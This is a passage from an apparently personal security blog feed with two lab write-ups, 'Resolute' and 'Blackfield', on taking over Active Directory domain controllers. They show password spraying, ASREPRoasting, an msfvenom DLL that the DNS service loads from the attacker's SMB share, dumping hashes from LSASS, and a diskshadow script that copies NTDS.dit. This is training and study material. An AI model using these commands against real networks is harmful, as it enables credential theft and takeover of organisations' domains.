  <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
  <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
  <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">Resolute</title><link href="https://omnisl4sh.github.io/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="Resolute" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/25/Resolute</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/25/Resolute.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Domain controller</strong> box. We first retrieve information about all users using <code class="language-plaintext highlighter-rouge">rpcclient</code> and find <strong>a password in the description field</strong> of one user which doesn’t work.</li>
  <li>We <em>reuse</em> that password and <strong>spray all domain users</strong> and we get <strong>access to another user who has PowerShell remoting privileges</strong>.</li>
  <li><em>Browsing the file system,</em> we find a <strong>PowerShell transcript file</strong> with <strong>credentials for another user</strong> in a hidden folder.</li>
  <li>The other user is a <strong>member of the DNSAdmins AD Group</strong> which can gain <strong>system privilges</strong> on the machine by means of <strong>DLL Injection</strong>.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>As usual we start with regular nmap with <code class="language-plaintext highlighter-rouge">-sC</code> for default scripts and <code class="language-plaintext highlighter-rouge">-sV</code> to enumerate versions and making sure to include all ports with <code class="language-plaintext highlighter-rouge">-p-</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-22 17:53:31Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49674/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc        Microsoft Windows RPC
49680/tcp open   msrpc        Microsoft Windows RPC
49712/tcp open   msrpc        Microsoft Windows RPC
50231/tcp closed unknown
50274/tcp open   unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m29s, median: 6m59s
| smb2-time: 
|   date: 2022-04-22T17:54:26
|_  start_date: 2022-04-22T17:39:18
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-04-22T10:54:23-07:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
</code></pre></div></div>

<h3 id="domain-controller-detection-host-information--finding-a-remote-administration-port">Domain Controller Detection, Host Information &amp; Finding a remote administration port</h3>
<p><em>Looking at the results,</em> we find a combination of ports that indicate a domain controller:</p>
<ol>
  <li>DNS on 53</li>
  <li>Kerberos on 88</li>
  <li>LDAP on 389 &amp; LDAPS on 636</li>
  <li>SMB on 445</li>
</ol>

<p>and we also find <em>WinRM</em> on 5985 which would be handy in getting a <strong>shell</strong> <em>if we manage to get a user that’s in</em> <strong>Windows Remote Management</strong> <em>group.</em></p>

<p>We also find out from the <strong>nmap script</strong> that the operating system is <strong>Windows Server 2016 Standard 14393</strong> and that the domain name is <strong>megabank.local</strong> and that the computer name is <strong>Resolute.</strong></p>

<h3 id="setting-up-our-dns">Setting up our DNS</h3>
<p>we add this computer to our <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to make usage of tools like <code class="language-plaintext highlighter-rouge">impacket</code> easier.</p>

<p><img src="/assets/Resolute/etc-resolv-conf.jpg" alt="etc-resolv-conf" /></p>

<h3 id="smb-share-enumeration-as-nullanonymous">SMB share enumeration as Null/Anonymous</h3>
<p>enumerating shares using multiple options doesn’t give us any results:</p>

<p><img src="/assets/Resolute/smb-enum.jpg" alt="smb-enum" /></p>

<h3 id="enumerating-rpc-with-rpcclient">Enumerating RPC with <code class="language-plaintext highlighter-rouge">rpcclient</code></h3>
<p><em>using</em> <code class="language-plaintext highlighter-rouge">rpcclient</code> <em>with a blank user</em> <code class="language-plaintext highlighter-rouge">-U ''</code> <em>and the</em> <code class="language-plaintext highlighter-rouge">-N</code> <em>flag for no password</em>, we get a bunch of users with <code class="language-plaintext highlighter-rouge">enumdomusers</code></p>

<p><img src="/assets/Resolute/enum-dom-users.jpg" alt="enum-dom-users" /></p>

<p>we get more details using <code class="language-plaintext highlighter-rouge">querydispinfo2</code></p>

<p><img src="/assets/Resolute/querydispinfo2.jpg" alt="querydispinfo2" /></p>

<p><em>looking at the description for the</em> <code class="language-plaintext highlighter-rouge">marko</code> <em>user,</em> we see written: <code class="language-plaintext highlighter-rouge">Account created. Password set to Welcome123!</code>. We immediately try to login as that user but it doesn’t work :/</p>

<p><img src="/assets/Resolute/marko-failed.jpg" alt="marko-failed" /></p>

<h3 id="who-else-is-using-that-password">Who else is using that password?</h3>
<p><em>having got an idea of a possible password,</em> a good logical step is to try that against the entire domain. we put what we got from <code class="language-plaintext highlighter-rouge">rpcclient &gt; enumdomusers</code> into a text file <code class="language-plaintext highlighter-rouge">users.txt</code> and use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to do a <strong>Password Spray.</strong></p>

<p><img src="/assets/Resolute/got-melanie.jpg" alt="got-melanie" /></p>

<p><strong>We’re lucky! :D</strong> the <code class="language-plaintext highlighter-rouge">melanie</code> user authenticated.</p>

<h3 id="options-available-after-getting-a-valid-ad-user">Options available after getting a valid AD user</h3>

<p><em>Having a valid AD user,</em> we got a couple of things to check:</p>
<ol>
  <li><strong>Code execution with WinRM:</strong> Check</li>
</ol>

<p><img src="/assets/Resolute/melanie-got-winrm.jpg" alt="melanie-got-winrm" /></p>

<ol>
  <li><strong>SMB Shares:</strong> Nothing there but we can enumerate GPP</li>
</ol>

<p><img src="/assets/Resolute/melanie-smb-access.jpg" alt="melanie-smb-access" /></p>

<ol>
  <li><strong>GPP Enumeration</strong> (<em>since it’s a domain controller</em>)</li>
</ol>

<p><img src="/assets/Resolute/GPP-check.jpg" alt="GPP-check" /></p>

<ol>
  <li><strong>ASREPRoast</strong> (<em>could be done without creds but we moved down the password spray path first</em>):  No results</li>
</ol>

<p><img src="/assets/Resolute/asreproast.jpg" alt="asreproast" /></p>

<ol>
  <li><strong>Kerberoasting:</strong> didn’t get results either</li>
</ol>

<p><img src="/assets/Resolute/Kerberoast.jpg" alt="Kerberoast" /></p>

<ol>
  <li><strong>BloodHound:</strong> <em>With remote code execution using</em> <strong>WinRM</strong>, we decide to run <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> from the shell</li>
</ol>

<p><img src="/assets/Resolute/sharphound-collection.jpg" alt="sharphound-collection" /></p>

<h3 id="browsing-bloodhound-output">Browsing Bloodhound output</h3>
<p><em>After browsing</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>for a while</em>, we find that we would have a clear path to Domain Admin if we manage to get the <code class="language-plaintext highlighter-rouge">ryan</code> user. This is because he is a member of the DNS Admins group which can be abused to elevate our privileges. He’s also a member of <strong>Remote Management Users</strong> and that means we can execute code using <strong>WinRM</strong> too.</p>

<p><img src="/assets/Resolute/ryan-should-takeover.jpg" alt="ryan-should-takeover" /></p>

<p>But we don’t have him as of the moment. So we look around the file system to see if we can find something to help us.</p>

<h3 id="finding-creds-in-hidden-folders">Finding Creds in Hidden Folders</h3>
<p><em>Looking around the</em> <code class="language-plaintext highlighter-rouge">C:</code> <em>drive</em>, we find the creds of the <code class="language-plaintext highlighter-rouge">ryan</code> user in <code class="language-plaintext highlighter-rouge">c:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></p>

<p><img src="/assets/Resolute/transcript-found.jpg" alt="transcript-found" /></p>

<p><img src="/assets/Resolute/ryan-creds-found.jpg" alt="ryan-creds-found" /></p>

<p>The creds turn out to be valid and we get a shell as the <code class="language-plaintext highlighter-rouge">ryan</code> user</p>

<p><img src="/assets/Resolute/shell-as-ryan.jpg" alt="shell-as-ryan" /></p>

<h3 id="dnsadmins-abuse">DNSAdmins Abuse</h3>
<p><em>Using</em> <strong>Google</strong>, we come across an excellent article from <strong>Ired.team</strong> website (https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) fully explaining the a way we can exploit <code class="language-plaintext highlighter-rouge">ryan</code>’s’ membership in the <strong>DNSAdmins</strong> group to own the domain.</p>

<p>We should need to compile a dll using <code class="language-plaintext highlighter-rouge">msfvenom</code> and configure the locally running <strong>DNS Service</strong> to load that dll <em>remotely</em> from our <strong>SMB share</strong>.</p>

<p>we’re going to use a payload that doesn’t cause the <strong>DNS</strong> service to hang. It should be something simple like changing the the domain administrator’s password</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll &gt; owned.dll</code></p>

<p><img src="/assets/Resolute/killer-dll.jpg" alt="killer-dll" /></p>

<p>we then host it using <strong>Impacket’s</strong> <code class="language-plaintext highlighter-rouge">smbserver.py</code></p>

<p><img src="/assets/Resolute/smb-server-up.jpg" alt="smb-server-up" /></p>

<p><em>after that,</em> we’re going to reconfigure the <strong>DNS</strong> service using <code class="language-plaintext highlighter-rouge">dnscmd</code> with the <code class="language-plaintext highlighter-rouge">/config</code> flag along with <code class="language-plaintext highlighter-rouge">/serverlevelplugindll</code> pointing to our <strong>SMB</strong> share named <code class="language-plaintext highlighter-rouge">share</code>. It should be as below:</p>

<p><code class="language-plaintext highlighter-rouge">dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll</code></p>

<p>we can then trigger the execution by stopping the <strong>DNS</strong> service and restarting it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
sc.exe start dns
</code></pre></div></div>

<p><img src="/assets/Resolute/dns-admins-abuse.jpg" alt="dns-admins-abuse" /></p>

<p>we get a connect back on our <strong>SMB</strong> share and code execution occures giving us the <strong>Domain Admin</strong> in our hands</p>

<p><img src="/assets/Resolute/got-domain-admin.jpg" alt="got-domain-admin" /></p>

<h3 id="notes-and-pitfalls">Notes and pitfalls</h3>
<ul>
  <li>using the <code class="language-plaintext highlighter-rouge">sc</code> command without the <code class="language-plaintext highlighter-rouge">.exe</code> at the end didn’t work. This took me a while to figure out.</li>
</ul>

<p><img src="/assets/Resolute/troubleshooting-sc.jpg" alt="troubleshooting-sc" /></p>

<ul>
  <li>Also, copying the <code class="language-plaintext highlighter-rouge">msfvenom</code> generated locally on the machine dll didn’t work because the antivirus kept eating it up xD</li>
</ul>

<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain controller box. We first retrieve information about all users using rpcclient and find a password in the description field of one user which doesn’t work. We reuse that password and spray all domain users and we get access to another user who has PowerShell remoting privileges. Browsing the file system, we find a PowerShell transcript file with credentials for another user in a hidden folder. The other user is a member of the DNSAdmins AD Group which can gain system privilges on the machine by means of DLL Injection.]]></summary></entry><entry><title type="html">Blackfield</title><link href="https://omnisl4sh.github.io/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="Blackfield" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/18/Blackfield</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/18/Blackfield.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Domain Controller</strong> machine. We first find <strong>SMB anonymous read access</strong> to a share containing a list of folders which can be used as usernames.</li>
  <li>We perform an <strong>ASREPRoast attack</strong> using the created wordlist to get credentials for the <code class="language-plaintext highlighter-rouge">support</code> user.</li>
  <li><em>Using</em> <strong>BloodHound</strong> <em>to enumerate the domain,</em> we find that this user <em>can reset the password for another account</em> <code class="language-plaintext highlighter-rouge">audit2020</code></li>
  <li><em>After resetting</em> <code class="language-plaintext highlighter-rouge">audit2020</code>‘<em>s password</em>, we gain access to the <code class="language-plaintext highlighter-rouge">forensic</code> <strong>SMB share</strong> which has a <strong>memory dump</strong> of <code class="language-plaintext highlighter-rouge">lsass.exe</code></li>
  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">Mimikatz</code> <em>to extract hashes from the dump,</em> we gain access to the <code class="language-plaintext highlighter-rouge">svc_backup</code> user.</li>
  <li><code class="language-plaintext highlighter-rouge">svc_backup</code> is a member of the <strong>Backup Operators</strong> group which have the <em>privilege of backing up most files on the domain controller</em>.</li>
  <li>We <em>abuse</em> this privilege to back up the <strong>NTDS.dit</strong> file and the <strong>system registry hive</strong> which we use to dump <strong>all the NTLM hashes of the domain</strong>.</li>
  <li><em>With the Domain Administrators NTLM hash,</em> we can <strong>Pass-the-Hash</strong> to gain full access.</li>
</ul>

<hr />

<h3 id="standard-nmap">Standard Nmap</h3>
<p>We do a standard <code class="language-plaintext highlighter-rouge">nmap</code> with service detection <code class="language-plaintext highlighter-rouge">-sV</code> and default scripts <code class="language-plaintext highlighter-rouge">-sC</code> on all ports:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-15 21:28:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-15T21:28:14
|_  start_date: N/A
</code></pre></div></div>

<h3 id="domain-controller-signature">Domain Controller Signature</h3>

<p>We see a combination of ports indicative of a <strong>Domain Controller</strong>: <strong>DNS</strong> on 53, <strong>Kerberos</strong> on 88, <strong>LDAP</strong> on 389 and <strong>SMB</strong> on 445.
We also notice the domain name on LDAP is <strong>Blackfield.local</strong> and the hostname <strong>DC01</strong></p>

<p>we add an <code class="language-plaintext highlighter-rouge">nameserver</code> entry in our <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> file for the machine’s IP and proceed to enumerate <strong>SMB</strong> for null/anonymous access.</p>

<h3 id="smb-enumeration">SMB Enumeration</h3>

<p>we try a few inputs and manage to get a listing of the shares using anonymous authentication:</p>

<p><img src="/assets/Blackfield/SMB-share-enum.jpg" alt="SMB-share-enum" /></p>

<p><em>looking at the shares,</em> we see that we have <code class="language-plaintext highlighter-rouge">READ</code> access to the <code class="language-plaintext highlighter-rouge">profiles$</code> share. We also notice another non-standard share: <code class="language-plaintext highlighter-rouge">forensic</code> that had a comment <code class="language-plaintext highlighter-rouge">Forensic / Audit share</code></p>

<p><em>connecting with</em> <code class="language-plaintext highlighter-rouge">smbclient</code>, we see many folders that look like usernames:</p>

<p><img src="/assets/Blackfield/profiles-share.jpg" alt="profiles-share" /></p>

<h3 id="mounting-smb-to-linux">Mounting SMB to Linux</h3>

<p>we mount the share using <code class="language-plaintext highlighter-rouge">mount -t cifs -o 'username=a' //10.10.10.192/Profiles$ /mnt</code> so we can use handy commands like <code class="language-plaintext highlighter-rouge">find</code> and look for interesting files within.</p>

<p><img src="/assets/Blackfield/no-files-in-prof-share.jpg" alt="no-files-in-prof-share" /></p>

<p>we notice no files are there. But, we can still save those foldernames to be used as a <em>userlist</em> for future attacks. we do that using <code class="language-plaintext highlighter-rouge">ls</code> with the <code class="language-plaintext highlighter-rouge">-1</code> flag to have the names on one column.</p>

<h3 id="asreproasting">ASREPRoasting</h3>

<p><em>Having this list,</em> we launch an <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code>.</p>

<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/ -request -usersfile users.txt</code></p>

<p><img src="/assets/Blackfield/asrep-roast.jpg" alt="asrep-roast" /></p>

<p><em>looking at the output,</em> we notice the hash has been captured for the <code class="language-plaintext highlighter-rouge">support</code> user. We also notice that <em>for most users,</em> we get the error: <code class="language-plaintext highlighter-rouge">Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</code> that indicates that those usernames don’t exist. <em>As for the users with the error:</em> <code class="language-plaintext highlighter-rouge">User &lt;USER&gt; doesn't have UF_DONT_REQUIRE_PREAUTH set</code> they exist but are not <em>ASREPRoastable</em>.</p>

<p>these were <code class="language-plaintext highlighter-rouge">svc_backup</code> and <code class="language-plaintext highlighter-rouge">audit2020</code>.</p>

<p>we’re going to need to get to that <code class="language-plaintext highlighter-rouge">audit2020</code> user if we want access to its share (<code class="language-plaintext highlighter-rouge">forensic</code>).</p>

<p><em>Right now,</em> we need to crack the hash for the <code class="language-plaintext highlighter-rouge">support</code> user. We do that using <code class="language-plaintext highlighter-rouge">john</code> and the password is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code>.</p>

<p>We try authenticating using <code class="language-plaintext highlighter-rouge">crackmapexec</code> and are successful.</p>

<p><img src="/assets/Blackfield/support-smb-shares.jpg" alt="support-smb-shares" /></p>

<p>We try to remote using <strong>WinRM</strong> but no luck :/</p>

<h3 id="getting-all-ad-users-for-future-attacks">Getting all AD users for future attacks</h3>

<p><em>After investigating the new-accessible shares</em> <code class="language-plaintext highlighter-rouge">SYSVOL</code> <em>and</em> <code class="language-plaintext highlighter-rouge">NETLOGON</code>, we find nothing important. So we proceed to pull the full userlist from the domain using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>:</p>

<p><img src="/assets/Blackfield/impacket-get-ad-user.jpg" alt="impacket-get-ad-user" /></p>

<p>we find that the usernames we found in the <code class="language-plaintext highlighter-rouge">profiles$</code> have different <code class="language-plaintext highlighter-rouge">SamAccountNames</code> and that’s why they weren’t authenticating.</p>

<h3 id="kerberoasting--asreproasting">Kerberoasting &amp; ASREPRoasting</h3>

<p>we use the new AD user list to launch another <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack but get no new results.</p>

<p>we also try <code class="language-plaintext highlighter-rouge">Kerberoasting</code> but find no entries:</p>

<p><img src="/assets/Blackfield/kerberoast.jpg" alt="kerberoast" /></p>

<h3 id="pattern-guessing--password-spraying">Pattern guessing &amp; Password Spraying</h3>

<p>I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to get the password policy of the domain before doing any spraying</p>

<p><img src="/assets/Blackfield/pass-pol.jpg" alt="pass-pol" /></p>

<p>Looks like there’s no account lockout at all :D</p>

<p>I spray with the full AD userlist from <code class="language-plaintext highlighter-rouge">GetADUsers.py</code> with the <code class="language-plaintext highlighter-rouge">support</code> password and some variants like: <code class="language-plaintext highlighter-rouge">#01^BlackKnight</code> but get nothing either :/</p>

<h3 id="bloodhound--abusing-the-forcechangepassword-right">Bloodhound &amp; Abusing the <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> right</h3>

<p>I then use <code class="language-plaintext highlighter-rouge">bloodhound</code> to get a look at what I can do with the support account. And I notice that I can reset the password for the <code class="language-plaintext highlighter-rouge">audit2020</code> user:</p>

<p><img src="/assets/Blackfield/force-change-password-right.jpg" alt="force-change-password-right" /></p>

<p>I find this right by clicking the <code class="language-plaintext highlighter-rouge">First Degree Object Control</code> box under the <code class="language-plaintext highlighter-rouge">Node Info</code> tab as highlighted in the image above.</p>

<p><em>By right-clicking the link,</em> I find the <code class="language-plaintext highlighter-rouge">PowerView</code> command that I can run to abuse this right. This is awesome!</p>

<p><img src="/assets/Blackfield/link-help.jpg" alt="link-help" /></p>

<p><img src="/assets/Blackfield/abuse-help.jpg" alt="abuse-help" /></p>

<p><em>it says that by using the command</em> <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code>, we can reset the password for the <code class="language-plaintext highlighter-rouge">audit2020</code> account and be able to use it.</p>

<h3 id="using-a-windows-machine-to-do-the-deed">Using a Windows machine to do the deed</h3>

<p>We can do so by using a <code class="language-plaintext highlighter-rouge">Windows</code> host. We can run the <code class="language-plaintext highlighter-rouge">RunAs.exe</code> utility with the <code class="language-plaintext highlighter-rouge">/netonly</code> flag. That would let us use a set of credentials in the network’s context and be able to do stuff.</p>

<p>But we first have to set the DNS on both the <code class="language-plaintext highlighter-rouge">Ethernet</code> and <code class="language-plaintext highlighter-rouge">OpenVPN</code> interfaces:</p>

<p><img src="/assets/Blackfield/setting-dns-on-interfaces.jpg" alt="setting-dns-on-interfaces" /></p>

<p>we can then authenticate to the network as the <code class="language-plaintext highlighter-rouge">support</code> user and we are able to list the <strong>SMB</strong> shares:</p>

<p><img src="/assets/Blackfield/runas-netonly.jpg" alt="runas-netonly" /></p>

<p>we import <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> and use the <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code> with the <code class="language-plaintext highlighter-rouge">-Domain</code> flag and use the <code class="language-plaintext highlighter-rouge">-Verbose</code> flag (<em>in case we need to troubleshoot</em>). Making sure to have the password <em>complex enough</em> and casting it to a <code class="language-plaintext highlighter-rouge">Secure String</code> object using the <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> <strong>PowerShell</strong> cmdlet.</p>

<p>The command does take some time… But we’re successful in resetting the password to <code class="language-plaintext highlighter-rouge">Password123!</code> in the end :D</p>

<p><img src="/assets/Blackfield/audit-2020-reset.jpg" alt="audit-2020-reset" /></p>

<h3 id="smb-forensic-share-enumeration">SMB forensic share enumeration</h3>

<p><em>Using the new password,</em> we find that we can now read the <code class="language-plaintext highlighter-rouge">forensic</code> share.</p>

<p><img src="/assets/Blackfield/audit-2020-share-access.jpg" alt="audit-2020-share-access" /></p>

<p><em>after mounting it,</em> we see that there’s a very interesting file that we can access in the <code class="language-plaintext highlighter-rouge">memory_analysis</code> folder. That is <code class="language-plaintext highlighter-rouge">lsass.zip</code>.</p>

<h3 id="a-brief-about-lsass">A brief about LSASS</h3>

<p><strong>LSASS.exe</strong> is the main authentication process in <strong>Windows</strong>. This process holds the credentials of all users who had logged into the computer using one way or another.</p>

<p><img src="/assets/Blackfield/mounting-forensic-share.jpg" alt="mounting-forensic-share" /></p>

<p>we unzip the <code class="language-plaintext highlighter-rouge">lsass.zip</code> file to find a <code class="language-plaintext highlighter-rouge">.DMP</code> file which is a memory dump of the process.</p>

<p><img src="/assets/Blackfield/lsass-dmp.jpg" alt="lsass-dmp" /></p>

<h3 id="extracting-credentials-from-lsass-dump">Extracting credentials from LSASS dump</h3>

<p>we can use a tool called <code class="language-plaintext highlighter-rouge">pypykatz</code> (https://github.com/skelsec/pypykatz) to obtain hashes from the <code class="language-plaintext highlighter-rouge">.DMP</code> files.</p>

<p><code class="language-plaintext highlighter-rouge">pypykatz lsa minidump lsass.DMP</code> is the command.</p>

<p>We do a <code class="language-plaintext highlighter-rouge">grep</code> for the <strong>NT</strong> field for the <strong>NTLM hash</strong> and use the <code class="language-plaintext highlighter-rouge">-B</code> flag to get th 3 lines before it to get the usernames.</p>

<p><img src="/assets/Blackfield/pypkatz.jpg" alt="pypkatz" /></p>

<p>we find hashes for both the <code class="language-plaintext highlighter-rouge">Administrator</code> user and <code class="language-plaintext highlighter-rouge">svc_backup</code> accounts</p>

<p><em>Sadly,</em> the hash for the <code class="language-plaintext highlighter-rouge">administrator</code> account didn’t work, but the one for <code class="language-plaintext highlighter-rouge">svc_backup</code> did. And it also had access to <strong>PowerShell Remoting</strong> :)</p>

<p><img src="/assets/Blackfield/svc_backup_shell.jpg" alt="svc_backup_shell" /></p>

<h3 id="abusing-the-sebackupprivilege-held-by-the-backup-operators-ad-group">Abusing the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> held by the <code class="language-plaintext highlighter-rouge">Backup Operators</code> AD Group</h3>

<p><em>checking the group memberships on the</em> <code class="language-plaintext highlighter-rouge">svc_backup</code> <em>user,</em> we notice it’s a member of the <code class="language-plaintext highlighter-rouge">Backup Operators</code> group. <em>And, by extension,</em> it has the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</p>

<p><img src="/assets/Blackfield/sebackup-priv.jpg" alt="sebackup-priv" /></p>

<p>Having this privilege is very dangerous. This is because the ability to backup files includes a full <code class="language-plaintext highlighter-rouge">READ</code> access to most files on the system. The most critical being <code class="language-plaintext highlighter-rouge">NTDS.dit</code> which is the database where the usernames and hashes are stored within a <strong>Domain Controller</strong>.</p>

<p>Being able to grab the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> and the <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry hive would enable us to read all the hashes of the domain <em>including the</em> <strong>domain administrator’s</strong> <em>one.</em></p>

<p><em>By doing some research,</em> we come across this awesome post from <strong>Hacking Articles</strong> (https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) that tells us how we can abuse this privilege.</p>

<h3 id="diskshadow">Diskshadow</h3>

<p>We will be using the <code class="language-plaintext highlighter-rouge">diskshadow</code> command line utility with the <code class="language-plaintext highlighter-rouge">/s</code> flag for script mode and passing a script file as an argument.</p>

<p>The content should be something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
add volume c: alias abuse
create
expose %abuse% z:
</code></pre></div></div>

<p>this would essentially expose a <em>shadow</em> copy of the <code class="language-plaintext highlighter-rouge">c:</code> drive to another drive <code class="language-plaintext highlighter-rouge">z:</code>.</p>

<p>This is required because a file like <code class="language-plaintext highlighter-rouge">NTDS.dit</code> is constantly undergoing <code class="language-plaintext highlighter-rouge">READ</code> and <code class="language-plaintext highlighter-rouge">WRITE</code> operations which would make copying it infeasable under normal circumstances.</p>

<h3 id="changing-encoding-to-match-windows">Changing encoding to match Windows</h3>

<p><em>Having created this script file in</em> <strong>Linux</strong>, we will need to change its encoding to fit <strong>Windows</strong> for it to work properly. This can be done using the <code class="language-plaintext highlighter-rouge">unix2dos</code> command:</p>

<p><img src="/assets/Blackfield/abuse-dsh.jpg" alt="abuse-dsh" /></p>

<p>notice how the output of <code class="language-plaintext highlighter-rouge">file</code> command changes from <code class="language-plaintext highlighter-rouge">ASCII text</code> to <code class="language-plaintext highlighter-rouge">ASCII text, with CRLF line terminators</code> after conversion.</p>

<p>we upload the <code class="language-plaintext highlighter-rouge">.dsh</code> file using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">upload</code> function. And, we change to a writable directory <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> where we can run the utility:</p>

<p><img src="/assets/Blackfield/diskshadow-success.jpg" alt="diskshadow-success" /></p>

<p>it succeeds and we can list the contents of <code class="language-plaintext highlighter-rouge">c:</code> from <code class="language-plaintext highlighter-rouge">z:</code></p>

<h3 id="special-copying-mode-backup-mode">Special copying mode: <code class="language-plaintext highlighter-rouge">Backup Mode</code></h3>

